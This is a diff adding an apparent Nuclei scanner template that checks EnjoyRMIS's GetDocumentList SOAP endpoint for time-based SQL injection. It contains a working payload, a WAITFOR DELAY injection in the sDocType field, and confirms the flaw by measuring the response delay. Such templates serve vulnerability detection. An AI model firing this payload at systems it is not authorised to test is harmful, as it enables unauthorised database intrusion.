@@ -1,0 +1,47 @@
+id: poc-enjoyrmis-getdocumentlist-sqli
+info:
+  name: EnjoyRMIS GetDocumentList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The EnjoyRMIS GetDocumentList endpoint is vulnerable to a SQL injection attack, allowing an attacker to execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetDocumentList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetDocumentList xmlns="http://tempuri.org/">
+              <sDocType>1';WAITFOR DELAY '0:0:{{t1}}'--</sDocType>
+              <bCreateDt>string</bCreateDt>
+              <eCreateDt>string</eCreateDt>
+              <sDocTitle>string</sDocTitle>
+              <sSendStoreId>string</sSendStoreId>
+              <sCreateUserNo>string</sCreateUserNo>
+            </GetDocumentList>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(content_type, 'text/xml')"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+      - type: word
+        words:
+          - "GetDocumentListResponse"
+          - "GetDocumentListResult"
+        part: body
